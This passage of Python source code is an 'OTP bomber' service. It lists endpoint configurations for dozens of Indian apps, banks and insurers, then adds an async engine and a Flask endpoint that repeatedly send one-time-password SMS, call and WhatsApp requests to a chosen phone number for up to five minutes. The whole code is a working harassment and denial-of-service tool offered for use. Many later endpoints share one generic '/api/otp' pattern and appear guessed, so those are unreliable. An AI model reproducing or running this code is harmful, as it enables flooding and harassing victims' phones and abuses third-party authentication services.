    {
        "name": "Dream11 SMS",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) {{ registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) {{ message }} }}","variables":{{"email":"test@gmail.com","mobileNumber":"{p}","password":"Test@123"}}}}'
    },
    {
        "name": "Byjus SMS",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"phoneNumber={p}&page=free-trial-classes"
    },
    {
        "name": "Unacademy SMS",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","country_code":"IN","otp_type":1,"send_otp":true}}'
    },
    {
        "name": "Vedantu SMS",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phoneCode":"+91","phoneNumber":"{p}","ver":"11.345"}}'
    },
    {
        "name": "RedBus SMS",
        "url": "https://m.redbus.in/api/getOtp?number={p}&cc=91&whatsAppOpted=undefined",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Oyo SMS",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {"Content-Type": "text/plain;charset=UTF-8"},
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91","nod":4}}'
    },
    {
        "name": "Makemytrip SMS",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"loginId":"{p}","type":"MOBILE","version":2,"countryCode":"91"}}'
    },
    {
        "name": "Goibibo SMS",
        "url": "https://www.goibibo.com/common/downloadsms/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"mbl={p}"
    },
    {
        "name": "Ola SMS",
        "url": "https://accounts.olacabs.com/api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobileNumber":"{p}","dialingCode":"+91","countryCode":"IN","headers":{{}},"verificationId":null}}'
    },
    {
        "name": "Uber SMS",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Amazon SMS",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"email={p}&create=1"
    },
    {
        "name": "Flipkart SMS",
        "url": "https://www.flipkart.com/api/5/user/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"loginId=+91{p}"
    },
    {
        "name": "Myntra SMS",
        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Paytm SMS",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'
    },
    {
        "name": "PhonePe SMS",
        "url": "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Zomato SMS",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"country_id":1,"phone":"{p}","verification_type":"sms","method":"phone"}}'
    },
    {
        "name": "Swiggy SMS",
        "url": "https://www.swiggy.com/mapi/auth/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"name":"Test","email":"test@gmail.com","password":"Test@123","referral_code":"","mobile":"{p}","_csrf":"test"}}'
    },
    {
        "name": "BigBasket SMS",
        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"identifier":"{p}"}}'
    },
    {
        "name": "BookMyShow SMS",
        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com"}}}}'
    },
    {
        "name": "Ajio SMS",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"firstName":"Test","login":"test@gmail.com","password":"Test@123","genderType":"Male","mobileNumber":"{p}","requestType":"SENDOTP"}}'
    },
    {
        "name": "Nykaa SMS",
        "url": "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Practo SMS",
        "url": "https://accounts.practo.com/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"client_name=Practo%20Android%20App&mobile=+91{p}&fingerprint=&device_name=test"
    },
    {
        "name": "1mg SMS",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":false}}'
    },
    {
        "name": "Netmeds SMS V2",
        "url": "https://www.netmeds.com/mst/rest/v1/id/details/{p}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PharmEasy SMS V2",
        "url": "https://pharmeasy.in/api/auth/requestOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"contactNumber":"{p}"}}'
    },
    {
        "name": "Croma SMS",
        "url": "https://api.croma.com/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Reliance Digital SMS",
        "url": "https://www.reliancedigital.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "FirstCry SMS",
        "url": "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Zepto SMS",
        "url": "https://api.zepto.com/v2/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Blinkit SMS",
        "url": "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Mobikwik SMS",
        "url": "https://www.mobikwik.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Freecharge SMS",
        "url": "https://www.freecharge.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Airtel Thanks SMS",
        "url": "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Jio SMS",
        "url": "https://www.jio.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Vi SMS",
        "url": "https://www.myvi.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "PolicyBazaar SMS",
        "url": "https://www.policybazaar.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "CoverFox SMS",
        "url": "https://www.coverfox.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Acko SMS",
        "url": "https://www.acko.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Digit Insurance SMS",
        "url": "https://www.godigit.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Ergo SMS",
        "url": "https://www.hdfcergo.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "ICICI Lombard SMS",
        "url": "https://www.icicilombard.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Bajaj Allianz SMS",
        "url": "https://www.bajajallianz.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Star Health SMS",
        "url": "https://www.starhealth.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Max Bupa SMS",
        "url": "https://www.maxbupa.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Life SMS",
        "url": "https://www.kotaklife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SBI Life SMS",
        "url": "https://www.sbilife.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "LIC SMS",
        "url": "https://www.licindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "HDFC Life SMS",
        "url": "https://www.hdfclife.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Axis Bank SMS",
        "url": "https://www.axisbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "ICICI Bank SMS",
        "url": "https://www.icicibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "HDFC Bank SMS",
        "url": "https://www.hdfcbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "SBI Bank SMS",
        "url": "https://www.sbi.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Kotak Bank SMS",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Yes Bank SMS",
        "url": "https://www.yesbank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "IndusInd Bank SMS",
        "url": "https://www.indusind.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "IDFC Bank SMS",
        "url": "https://www.idfcfirstbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "AU Bank SMS",
        "url": "https://www.aubank.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "RBL Bank SMS",
        "url": "https://www.rblbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bandhan Bank SMS",
        "url": "https://www.bandhanbank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Federal Bank SMS",
        "url": "https://www.federalbank.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Canara Bank SMS",
        "url": "https://www.canarabank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "PNB SMS",
        "url": "https://www.pnbindia.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "Bank of Baroda SMS",
        "url": "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
    {
        "name": "Union Bank SMS",
        "url": "https://www.unionbankofindia.co.in/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "IDBI Bank SMS",
        "url": "https://www.idbibank.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}"}}'
    },
]

# Combine all APIs
for api in CALL_APIS + WHATSAPP_APIS + SMS_APIS:
    ULTIMATE_OTP_APIS.append(api)

# ==================================================================
# 🚀 ASYNC BOMBER ENGINE
# ==================================================================
class BomberEngine:
    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=10)
        self.semaphore = asyncio.Semaphore(50)  # 50 concurrent requests
        self.success_count = 0
        self.fail_count = 0
        self.total_apis = len(ULTIMATE_OTP_APIS)
        self.lock = threading.Lock()
        
    def process_api(self, api: dict, phone: str) -> dict:
        """Process a single API configuration and return the request details"""
        url = api.get("url")
        if callable(url):
            url = url(phone)
            
        data = api.get("data")
        if callable(data):
            data = data(phone)
        elif data is None:
            data = {}
        elif isinstance(data, str):
            pass  # keep as string
            
        headers = api.get("headers", {}).copy()
        if isinstance(headers, dict):
            # Replace any callable headers
            for k, v in headers.items():
                if callable(v):
                    if k.lower() == "content-length":
                        headers[k] = str(len(str(data))) if data else "0"
                    else:
                        headers[k] = v(data) if callable(v) else v
        
        return {
            "name": api.get("name", "Unknown"),
            "url": url,
            "method": api.get("method", "POST"),
            "headers": headers,
            "data": data,
            "phone_format": api.get("phone_format", "raw")
        }

    async def make_request(self, session: aiohttp.ClientSession, api: dict, phone: str):
        """Make a single API request"""
        async with self.semaphore:
            try:
                req = self.process_api(api, phone)
                method = req.get("method", "POST").upper()
                url = req.get("url")
                headers = req.get("headers", {})
                data = req.get("data", {})
                
                if not url:
                    return False, "No URL"
                
                # Prepare request
                kwargs = {
                    "headers": headers,
                    "timeout": self.timeout,
                }
                
                if method == "GET":
                    kwargs["params"] = data if isinstance(data, dict) else {}
                else:
                    if isinstance(data, dict):
                        kwargs["json"] = data
                    else:
                        kwargs["data"] = data
                
                # Make request
                async with session.request(method, url, **kwargs) as response:
                    status = response.status
                    success = 200 <= status < 300
                    
                    if success:
                        with self.lock:
                            self.success_count += 1
                    
                    return success, status
                    
            except Exception as e:
                with self.lock:
                    self.fail_count += 1
                return False, str(e)

    async def bomb_phone(self, phone: str, duration: int = 30) -> dict:
        """Bomb a phone number with all APIs for specified duration"""
        self.success_count = 0
        self.fail_count = 0
        
        start_time = time.time()
        end_time = start_time + duration
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            # Create initial batch
            for api in ULTIMATE_OTP_APIS:
                tasks.append(self.make_request(session, api, phone))
            
            # Run initial batch
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Continue bombing until duration ends
            while time.time() < end_time:
                # Create new batch with random APIs
                batch_size = min(50, len(ULTIMATE_OTP_APIS))
                selected_apis = random.sample(ULTIMATE_OTP_APIS, batch_size)
                
                tasks = []
                for api in selected_apis:
                    tasks.append(self.make_request(session, api, phone))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Small delay between batches to prevent rate limiting
                await asyncio.sleep(0.1)
            
            elapsed = time.time() - start_time
            
            return {
                "phone": phone,
                "total_apis": self.total_apis,
                "success": self.success_count,
                "failed": self.fail_count,
                "duration": round(elapsed, 2),
                "requests_per_second": round(self.success_count / elapsed, 2) if elapsed > 0 else 0
            }

# ==================================================================
# 🌐 FLASK API SERVER
# ==================================================================
bomber = BomberEngine()

@app.route('/')
def home():
    return jsonify({
        "service": "🔥 ULTIMATE OTP BOMBER API",
        "status": "online",
        "endpoints": {
            "/bomber?number=PHONE": "Start bombing a phone number",
            "/bomber?number=PHONE&duration=SECONDS": "Start bombing for specific duration",
            "/status": "Check service status",
            "/apis": "Get list of all APIs"
        },
        "total_apis": len(ULTIMATE_OTP_APIS),
        "version": "3.0.0"
    })

@app.route('/bomber')
def bomb():
    """Main bombing endpoint"""
    phone = request.args.get('number', '').strip()
    duration = int(request.args.get('duration', 30))
    
    if not phone:
        return jsonify({"error": "Phone number required", "usage": "/bomber?number=9876543210"}), 400
    
    # Validate phone
    country_code, clean_phone = validate_phone(phone)
    if not clean_phone or len(clean_phone) != 10:
        return jsonify({"error": "Invalid phone number. Use 10-digit Indian number."}), 400
    
    # Validate duration
    if duration < 5:
        duration = 5
    elif duration > 300:
        duration = 300
    
    # Run bombing
    try:
        result = asyncio.run(bomber.bomb_phone(clean_phone, duration))
        return jsonify({
            "status": "success",
            "message": f"✅ Bombed {result['phone']} using {result['total_apis']} APIs",
            "stats": {
                "successful_requests": result['success'],
                "failed_requests": result['failed'],
                "total_requests": result['success'] + result['failed'],
                "duration_seconds": result['duration'],
                "requests_per_second": result['requests_per_second']
            }
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/status')
def status():
    """Get service status"""
    return jsonify({
        "status": "online",
        "total_apis": len(ULTIMATE_OTP_APIS),
        "call_apis": len(CALL_APIS),
        "whatsapp_apis": len(WHATSAPP_APIS),
        "sms_apis": len(SMS_APIS)
    })

@app.route('/apis')
def list_apis():
    """Get list of all APIs"""
    return jsonify({
        "total": len(ULTIMATE_OTP_APIS),
        "apis": [{"name": api.get("name", "Unknown"), "method": api.get("method", "POST")} for api in ULTIMATE_OTP_APIS]
    })

# ==================================================================
# 🚀 RUN SERVER
# ==================================================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   🔥 ULTIMATE OTP BOMBER API v3.0                        ║
    ║                                                           ║
    ║   📦 Total APIs: {}                                  ║
    ║   📞 Call APIs: {}                                      ║
    ║   💬 WhatsApp APIs: {}                                 ║
    ║   📱 SMS APIs: {}                                     ║
    ║                                                           ║
    ║   🚀 Server running at: http://localhost:5000            ║
    ║   📡 Endpoint: /bomber?number=9876543210               ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """.format(len(ULTIMATE_OTP_APIS), len(CALL_APIS), len(WHATSAPP_APIS), len(SMS_APIS)))
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
